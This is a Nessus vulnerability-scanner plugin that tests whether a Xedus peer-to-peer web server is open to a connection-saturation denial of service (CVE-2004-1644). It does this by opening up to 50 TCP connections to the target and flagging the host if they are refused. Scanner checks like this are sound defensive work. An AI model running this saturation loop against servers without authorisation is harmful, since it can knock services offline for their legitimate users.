#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# based on Michel Arboi work
#
# Ref: James Bercegay of the GulfTech Security Research Team
# This script is released under the GNU GPLv2

# Changes by Tenable:
# - Revised plugin title (9/4/09)


include("compat.inc");

if(description)
{
  script_id(14646);
  script_version("$Revision: 1.13 $");
  script_cve_id("CVE-2004-1644");
  script_bugtraq_id(11071);
  script_xref(name:"OSVDB", value:"9387");
  script_xref(name:"Secunia", value:"12418");

  script_name(english:"Xedus Webserver Connection Saturation DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a web server with a denial of
service vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host runs Xedus Peer to Peer web server.  This version
is vulnerable to a denial of service. An attacker could stop the
webserver from accepting user requests by establishing multiple
connections from the same host." );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00047-08302004" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
script_end_attributes();


  script_summary(english:"Checks for denial of service in Xedus");
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
  script_dependencies("xedus_detect.nasl");
  script_family(english:"Peer-To-Peer File Sharing");
  script_require_ports("Services/www", 4274);
  exit(0);
}

include("http_func.inc");

port = get_http_port(default:4274);
if ( ! get_kb_item("xedus/" + port + "/running")) exit(0);

if(get_port_state(port))
{ 
  soc = open_sock_tcp(port);
  if (! soc) return(0);
  
  s[0] = soc;

  for (i = 1; i < 50; i = i+1)
  {
    soc = open_sock_tcp(port);
    if (! soc)
    {
      security_warning(port);
      for (j = 0; j < i; j=j+1) close(s[j]);
    }
    sleep(1);
    s[i] = soc;
  }
  for (j = 0; j < i; j=j+1) close(s[j]);
}
exit(0);
